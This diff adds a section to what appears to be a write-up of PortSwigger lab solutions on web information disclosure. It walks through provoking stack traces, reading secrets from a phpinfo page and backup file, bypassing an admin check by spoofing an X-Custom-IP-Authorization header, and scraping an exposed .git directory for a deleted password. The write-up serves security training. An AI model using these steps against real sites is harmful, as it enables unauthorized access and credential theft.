@@ -1310,9 +1310,195 @@
 
 ---
 
-<!--
 ## **Information Disclosure**
 
+## **[Information Disclosure][information_disclosure]**
+
+1. #### **Information disclosure in error messages**
+
+    - Interact with the products of the site and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    https://<lab_url>/product       GET    (productId=1)
+    ...
+    https://<lab_url>/product       GET    (productId=20)
+    ```
+
+    - Send any of the **/product GET** requests to the **Repeater**.
+    - Set the product **productId** to a non-intenger value and repeat the request.
+
+    ```java
+    Internal Server Error: java.lang.NumberFormatException: For input string: "asdfg"
+    at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
+    at java.base/java.lang.Integer.parseInt(Integer.java:668)
+    at java.base/java.lang.Integer.parseInt(Integer.java:786)
+    ...
+    at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
+    at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
+    at java.base/java.lang.Thread.run(Thread.java:833)
+    Apache Struts 2 2.3.31
+    ```
+
+2. #### **Information disclosure on debug page**
+
+    - Look at the page source code.
+
+    ```html
+    ...
+    <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
+    ...
+    ```
+
+    - Access the exposed file **/cgi-bin/phpinfo.php**.
+
+    ```plaintext
+    ...
+    SECRET_KEY    z0dyvx6boonewxb9wq04o1x2h3ciucfq
+    ...
+    ```
+
+3. #### **Source code disclosure via backup files**
+
+    - Look at the **robots.txt** and **sitemap.xml** files.
+
+    ```plaintext
+    User-agent: *
+    Disallow: /backup
+    ```
+
+    - Access the URL **/backup** exposed in the **robots.txt** file.
+
+    ```plaintext
+    Index of /backup
+    Name                        Size
+    ProductTemplate.java.bak    1643B
+    ```
+
+    - Access the exposed file **ProductTemplate.java.bak**.
+
+    ```java
+    ...
+    ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
+        "org.postgresql.Driver",
+        "postgresql",
+        "localhost",
+        5432,
+        "postgres",
+        "postgres",
+        "v9x0m9cfq0rojvqx564r89kto3x2f8sa"
+    ).withAutoCommit();
+    ...
+    ```
+
+4. #### **Authentication bypass via information disclosure**
+
+    - Login and try to access to **/admin**, the message  
+    ***Admin interface only available to local users*** will appear.
+    - Send the **/admin GET** request to the **Repeater**.
+    - Set the HTTP request **method** to **TRACE** and repeat the request.
+    - Analyze the response and note the presence of the header **X-Custom-IP-Authorization**  
+    (notice that its value is your current IP adress).
+    - Set the HTTP request **method** back to **GET**, add the **X-Custom-IP-Authorization**
+    header with the value **127.0.0.1** and repeat the request.
+
+    ```plaintext
+    https://<lab_url>/admin                             GET     401 Unauthorized
+
+    https://<lab_url>/admin                             TRACE   200 OK
+
+    https://<lab_url>/admin                             GET     200 OK    (X-Custom-IP-Authorization: 127.0.0.1)
+    https://<lab_url>/admin/delete?username=carlos
+    ```
+
+5. #### **Information disclosure in version control history**
+
+    - Look at the **.git** directory.
+
+    ```plaintext
+    Index of /.git
+    Name            Size
+    <branches>
+    description     73B
+    <hooks>
+    <info>
+    <refs>
+    HEAD            23B
+    config          152B
+    <objects>
+    index           225B
+    COMMIT_EDITMSG  34B
+    <logs>
+    ```
+
+    - Download the folder content.
+
+    ```bash
+    wget --recursive https://<lab_url>/.git
+    ```
+
+    - Analyze the files via **git**.
+
+    ```bash
+    cd <lab_url>
+
+    git status
+        ...
+        deleted:    admin.conf
+        deleted:    admin_panel.php
+        ...
+
+    git log
+        commit 0db732bd771a601521fbaa6c681a7b77a29421ef (HEAD -> master)
+        ...
+        Remove admin password from config
+
+        commit 378b8d2a56fcd551df0c62c36918c51398f5a9d8
+        ...
+        Add skeleton admin panel
+
+    git diff
+        diff --git a/admin.conf b/admin.conf
+        deleted file mode 100644
+        index 21d23f1..0000000
+        --- a/admin.conf
+        +++ /dev/null
+        @@ -1 +0,0 @@
+        -ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+        diff --git a/admin_panel.php b/admin_panel.php
+        deleted file mode 100644
+        index 8944e3b..0000000
+        --- a/admin_panel.php
+        +++ /dev/null
+        @@ -1 +0,0 @@
+        -<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
+        \ No newline at end of file
+    ```
+
+    - **Restore** the deleted files and **reset** the first commit.
+
+    ```bash
+    git restore admin.conf admin_panel.php
+
+    git reset 378b8d2a56fcd551df0c62c36918c51398f5a9d8
+    ```
+
+    - Open the restored files.
+
+    ```bash
+    cat admin_panel.php
+        <?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
+    ```
+
+    ```bash
+    cat admin.conf
+        ADMIN_PASSWORD=79b97ud19cs3148e0e7t
+    ```
+
+[information_disclosure]: https://portswigger.net/web-security/information-disclosure
+
+---
+
+<!--
 ## **Access Control**
 
 ## **File Upload Vulnerabilities**
